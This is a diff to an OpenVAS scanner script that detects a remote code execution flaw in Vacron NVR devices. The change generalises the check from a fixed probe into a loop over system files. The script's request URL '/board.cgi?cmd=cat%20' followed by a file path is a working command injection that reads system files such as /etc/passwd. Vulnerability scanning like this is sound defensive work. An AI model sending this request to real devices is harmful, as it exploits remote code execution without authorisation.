@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_vacron_nvr_rce_vuln.nasl 11343 2018-09-12 06:36:46Z cfischer $
+# $Id: gb_vacron_nvr_rce_vuln.nasl 11672 2018-09-28 10:48:17Z jschulte $
 #
 # Vacron NVR Remote Code Execution Vulnerability
 #
@@ -29,11 +29,11 @@ CPE = "cpe:/a:vacron:nvr";
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.107187");
-  script_version("$Revision: 11343 $");
+  script_version("$Revision: 11672 $");
   script_tag(name:"cvss_base", value:"10.0");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
 
-  script_tag(name:"last_modification", value:"$Date: 2018-09-12 08:36:46 +0200 (Wed, 12 Sep 2018) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-09-28 12:48:17 +0200 (Fri, 28 Sep 2018) $");
   script_tag(name:"creation_date", value:"2017-10-11 10:31:53 +0200 (Wed, 11 Oct 2017)");
   script_name("Vacron NVR Remote Code Execution Vulnerability");
 
@@ -71,17 +71,25 @@ if(description)
 include("host_details.inc");
 include("http_func.inc");
 include("http_keepalive.inc");
+include("misc_func.inc");
 
-if (!port = get_app_port(cpe:CPE))
+if (!port = get_app_port(cpe: CPE))
   exit(0);
 
-url = "/board.cgi?cmd=cat%20/etc/passwd";
+files = traversal_files();
 
-if (http_vuln_check(port: port, url: url, pattern: "root:.*:0:[01]:", check_header: TRUE)) {
+foreach pattern(keys(files)) {
 
-  report = report_vuln_url(port: port, url: url) ;
-  security_message(port: port, data: report);
-  exit(0);
+  file = "/" + files[pattern];
+
+  url = "/board.cgi?cmd=cat%20" + file;
+
+  if (http_vuln_check(port: port, url: url, pattern: pattern, check_header: TRUE)) {
+
+    report = report_vuln_url(port: port, url: url) ;
+    security_message(port: port, data: report);
+    exit(0);
+  }
 }
 
 exit(99);
